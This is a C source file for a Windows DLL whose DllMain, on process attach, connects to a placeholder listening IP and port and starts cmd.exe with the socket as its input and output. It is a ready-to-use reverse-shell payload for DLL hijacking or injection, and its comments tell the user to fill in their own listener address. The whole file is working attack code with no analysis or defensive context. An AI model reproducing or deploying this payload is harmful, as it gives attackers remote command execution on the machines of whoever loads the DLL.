#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#define HOST "192.168.x.x"
#define PORT ####

BOOL APIENTRY DllMain(
    HANDLE hModule,       // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved    // Reserved
) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: { // A process is loading the DLL.
            WSADATA wsaData;
            SOCKET ws;
            struct sockaddr_in sa;
            STARTUPINFO si;
            PROCESS_INFORMATION pi;

            // Initialize winsock
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            ws = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

            // Setup connection settings
            sa.sin_family = AF_INET;
            // Remember to set your Listening Port at the top
            sa.sin_port = htons(PORT);
            // Remember to set your Listening IP at the top
            sa.sin_addr.s_addr = inet_addr(HOST);

            // Attempt to connect
            WSAConnect(ws, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL);

            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)ws;

            // Create cmd.exe process with the socket handle as stdin/stdout/stderr
            CreateProcess(NULL, (LPSTR) "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

            // Clean up
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            closesocket(ws);
            WSACleanup();

            break;
        }
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
